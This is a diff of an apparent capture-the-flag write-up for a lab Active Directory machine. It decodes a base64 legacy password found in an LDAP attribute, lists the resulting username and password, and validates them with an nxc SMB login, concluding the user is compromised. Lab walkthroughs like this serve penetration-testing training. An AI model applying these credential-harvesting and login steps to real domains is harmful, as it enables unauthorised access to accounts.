@@ -161,10 +161,20 @@ LDAP        10.129.18.9     389    CASC-DC1         cascadeLegacyPwd     clk0bjV
 After querying several different users on the domain i try this one and find credentials
 
 ```python
-r.thompson:clk0bjVldmE=
-```
-
-```python
 echo 'clk0bjVldmE=' | base64 -d                                                
 rY4n5eva
 ```
+
+```python
+r.thompson:rY4n5eva
+```
+After base64 decoding it i get his password
+
+```python
+nxc smb casc-dc1.cascade.local -u 'r.thompson' -p 'rY4n5eva'       
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
+```
+This user is compromised
+
+
